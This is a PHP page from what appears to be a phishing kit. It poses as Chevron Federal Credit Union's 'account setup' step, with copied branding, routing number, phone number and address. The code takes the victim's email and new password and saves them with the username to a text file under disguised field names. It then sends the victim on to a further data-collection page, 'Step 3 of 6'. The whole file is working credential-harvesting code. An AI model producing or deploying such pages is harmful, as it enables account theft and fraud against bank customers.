<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $confirmPassword = $_POST['confirmPassword'] ?? '';
    
    // Validation
    if (empty($email)) {
        $errors['email'] = 'Email is required';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors['email'] = 'Invalid email format';
    }
    
    if (empty($password)) {
        $errors['password'] = 'Password is required';
    } elseif (strlen($password) < 8) {
        $errors['password'] = 'Password must be at least 8 characters';
    }
    
    if (empty($confirmPassword)) {
        $errors['confirmPassword'] = 'Confirm password is required';
    } elseif ($password !== $confirmPassword) {
        $errors['confirmPassword'] = 'Passwords do not match';
    }
    
    if (empty($errors)) {
        // Save to test file
        $data = [
            'step' => 'email_password',
            'usrnm' => $username,
            'usr_eml' => $email,
            'acc_cd' => $password
        ];
        
        saveUserData('email_password.txt', $data);
        
        // Redirect to basic info page
        header('Location: basic_info.php');
        exit;
    }
}

$supportLinks = ['Forgot User ID', 'Forgot Password', 'Unlock Account'];

$complianceBadges = [
    [
        'title' => 'EQUAL HOUSING LENDER',
        'description' => 'We do business in accordance with the Federal Fair Housing Law and the Equal Credit Opportunity Act.'
    ],
    [
        'title' => 'NCUA',
        'description' => 'Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government.'
    ]
];

$referenceColumns = [
    [
        'heading' => 'ROUTING NUMBER',
        'lines' => ['#321075947']
    ],
    [
        'heading' => 'PHONE NUMBER',
        'lines' => ['800-232-8101', '24-hour service']
    ],
    [
        'heading' => 'LINKS',
        'lines' => ['Privacy Policy', 'Accessibility', 'Disclosures', 'Security Policy', 'ATM and Branch Locations', 'Rates']
    ],
    [
        'heading' => 'MAILING ADDRESS',
        'lines' => ['Chevron Federal Credit Union', 'PO Box 4107', 'Concord, CA 94524']
    ]
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chevron Federal Credit Union - Account Setup</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-white text-[#0e2f56] flex flex-col">
        <!-- Main Content -->
        <main class="flex-1">
            <!-- Blue Gradient Section with Login Card -->
            <section class="bg-gradient-to-r from-[#002c5c] via-[#014a90] to-[#0073ba] py-12 px-4">
                <div class="max-w-5xl mx-auto">
                    <!-- Header Logo -->
                    <div class="flex items-center gap-4 mb-8">
                        <img
                            src="assets/header_logo_bg.png"
                            alt="Chevron Federal Credit Union"
                            class="h-16 w-auto"
                        />
                    </div>

                    <!-- Two Column Card -->
                    <div class="bg-gradient-to-b from-[#f0f6fb] to-[#dfeef9] shadow-2xl rounded-sm flex flex-col md:flex-row">
                        <!-- Left Column: Account Setup Info -->
                        <div class="order-2 md:order-1 w-full md:w-5/12 px-8 py-10 border-t md:border-t-0 md:border-r border-[#91c1e4]">
                            <p class="text-2xl font-semibold text-[#0b5da7] mb-2">
                                Complete Your Profile
                            </p>
                            <p class="text-sm text-[#0e2f56] mb-4">
                                Set up your email address and create a secure password for your Chevron Federal Credit Union account.
                            </p>
                            <div class="space-y-3">
                                <div class="flex items-center gap-2 text-sm text-[#0e2f56]">
                                    <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
                                    </svg>
                                    <span>Strong password required (8+ chars)</span>
                                </div>
                                <div class="flex items-center gap-2 text-sm text-[#0e2f56]">
                                    <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
                                    </svg>
                                    <span>Email for account notifications</span>
                                </div>
                                <div class="flex items-center gap-2 text-sm text-[#0e2f56]">
                                    <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
                                    </svg>
                                    <span>Secure encrypted storage</span>
                                </div>
                            </div>
                        </div>

                        <!-- Right Column: Email & Password Form -->
                        <div class="order-1 md:order-2 w-full md:w-7/12 px-8 py-10">
                            <div class="flex flex-col md:flex-row md:items-center gap-4 mb-8">
                                <h2 class="text-lg font-semibold tracking-wide uppercase text-[#0e2f56]">
                                    Account Credentials
                                </h2>
                                <span class="hidden md:block h-8 w-px bg-[#9cc5e3]"></span>
                                <div class="text-sm text-[#0b5da7">Step 3 of 6</div>
                            </div>

                            <?php if (!empty($errors)): ?>
                                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                                    <div class="flex">
                                        <div class="flex-shrink-0">
                                            <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                            </svg>
                                        </div>
                                        <div class="ml-3">
                                            <p class="text-sm text-red-700">
                                                Please fix the following errors:
                                                <ul class="list-disc pl-5 mt-1">
                                                    <?php foreach ($errors as $error): ?>
                                                        <li><?php echo htmlspecialchars($error); ?></li>
                                                    <?php endforeach; ?>
                                                </ul>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            <?php endif; ?>

                            <form method="POST" action="" class="space-y-6">
                                <!-- Email Field -->
                                <div class="space-y-2">
                                    <label for="email" class="block text-sm font-semibold text-[#0e2f56]">
                                        Email Address
                                    </label>
                                    <input
                                        id="email"
                                        name="email"
                                        type="email"
                                        value="<?php echo htmlspecialchars($_POST['email'] ?? ''); ?>"
                                        class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                        placeholder="Enter your email address"
                                        autocomplete="email"
                                    />
                                    <?php if (isset($errors['email'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600">
                                            <?php echo htmlspecialchars($errors['email']); ?>
                                        </p>
                                    <?php endif; ?>
                                </div>

                                <!-- Password Field -->
                                <div class="space-y-2">
                                    <label for="password" class="block text-sm font-semibold text-[#0e2f56]">
                                        Create Password
                                    </label>
                                    <div class="relative">
                                        <input
                                            id="password"
                                            name="password"
                                            type="password"
                                            value="<?php echo htmlspecialchars($_POST['password'] ?? ''); ?>"
                                            class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                            placeholder="Create a strong password"
                                            autocomplete="new-password"
                                        />
                                        <button
                                            type="button"
                                            onclick="togglePassword('password')"
                                            class="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-semibold text-[#0b5da7] hover:underline"
                                        >
                                            <span id="toggleText-password">Show</span>
                                        </button>
                                    </div>
                                    <?php if (isset($errors['password'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600">
                                            <?php echo htmlspecialchars($errors['password']); ?>
                                        </p>
                                    <?php endif; ?>
                                    <p class="text-xs text-gray-600">
                                        Minimum 8 characters with a mix of letters, numbers, and symbols
                                    </p>
                                </div>

                                <!-- Confirm Password Field -->
                                <div class="space-y-2">
                                    <label for="confirmPassword" class="block text-sm font-semibold text-[#0e2f56]">
                                        Confirm Password
                                    </label>
                                    <div class="relative">
                                        <input
                                            id="confirmPassword"
                                            name="confirmPassword"
                                            type="password"
                                            value="<?php echo htmlspecialchars($_POST['confirmPassword'] ?? ''); ?>"
                                            class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                            placeholder="Confirm your password"
                                            autocomplete="new-password"
                                        />
                                        <button
                                            type="button"
                                            onclick="togglePassword('confirmPassword')"
                                            class="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-semibold text-[#0b5da7] hover:underline"
                                        >
                                            <span id="toggleText-confirmPassword">Show</span>
                                        </button>
                                    </div>
                                    <?php if (isset($errors['confirmPassword'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600">
                                            <?php echo htmlspecialchars($errors['confirmPassword']); ?>
                                        </p>
                                    <?php endif; ?>
                                </div>

                                <!-- Submit Button -->
                                <div class="pt-4">
                                    <button
                                        type="submit"
                                        class="w-full md:w-auto bg-[#003e7d] text-white font-semibold px-7 py-2 text-sm rounded-sm shadow hover:bg-[#002c5c] disabled:opacity-70"
                                    >
                                        Continue
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Compliance and Reference Information Section -->
            <section class="py-10 px-4">
                <div class="max-w-5xl mx-auto space-y-10 text-sm text-[#0e2f56]">
                    <!-- Compliance Badges -->
                    <div class="grid gap-6 md:grid-cols-2">
                        <?php foreach ($complianceBadges as $badge): ?>
                            <div class="border border-gray-200 rounded-sm p-5 shadow-sm bg-white">
                                <p class="font-semibold text-xs tracking-wide text-gray-700 mb-2 uppercase">
                                    <?php echo htmlspecialchars($badge['title']); ?>
                                </p>
                                <p class="text-sm text-gray-600 leading-relaxed">
                                    <?php echo htmlspecialchars($badge['description']); ?>
                                </p>
                            </div>
                        <?php endforeach; ?>
                    </div>

                    <!-- Reference Information Grid -->
                    <div class="grid gap-8 md:grid-cols-4">
                        <?php foreach ($referenceColumns as $column): ?>
                            <div class="space-y-2">
                                <p class="text-xs font-semibold tracking-wide text-gray-600 uppercase">
                                    <?php echo htmlspecialchars($column['heading']); ?>
                                </p>
                                <div class="space-y-1 text-sm text-gray-700">
                                    <?php foreach ($column['lines'] as $line): ?>
                                        <p><?php echo htmlspecialchars($line); ?></p>
                                    <?php endforeach; ?>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </section>
        </main>

        <!-- Footer -->
        <footer class="border-t border-gray-200">
            <div class="max-w-5xl mx-auto px-4 py-6 flex flex-col md:flex-row md:items-center md:justify-between gap-6">
                <div class="flex items-center justify-center md:justify-start gap-4">
                    <img
                        src="assets/equal-housing.png"
                        alt="Equal Housing Lender"
                        class="h-12 w-auto"
                    />
                    <img
                        src="assets/ncua.png"
                        alt="National Credit Union Administration"
                        class="h-12 w-auto"
                    />
                </div>
                <div class="text-xs text-gray-600 text-center md:text-right space-y-1">
                    <p>© 2025 Chevron Federal Credit Union</p>
                    <p>Version: 10.34.20250707.705.AWS</p>
                </div>
            </div>
        </footer>

        <!-- Help Button -->
        <button
            type="button"
            class="fixed bottom-6 right-6 inline-flex items-center gap-2 rounded-full bg-[#009a66] px-5 py-3 text-sm font-semibold text-white shadow-lg hover:bg-[#007a50]"
        >
            <span class="inline-flex items-center justify-center h-5 w-5 rounded-full bg-white text-[#009a66] text-xs font-bold">
                ?
            </span>
            Help
        </button>
    </div>

    <script>
        function togglePassword(fieldId) {
            const passwordInput = document.getElementById(fieldId);
            const toggleText = document.getElementById('toggleText-' + fieldId);
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                passwordInput.type = 'password';
                toggleText.textContent = 'Show';
            }
        }

        // Password strength indicator (optional enhancement)
        document.getElementById('password').addEventListener('input', function(e) {
            const password = e.target.value;
            const strength = checkPasswordStrength(password);
            // You could add a visual strength indicator here if desired
        });

        function checkPasswordStrength(password) {
            let strength = 0;
            if (password.length >= 8) strength++;
            if (password.match(/[a-z]/)) strength++;
            if (password.match(/[A-Z]/)) strength++;
            if (password.match(/[0-9]/)) strength++;
            if (password.match(/[^a-zA-Z0-9]/)) strength++;
            return strength;
        }
    </script>
</body>
</html>
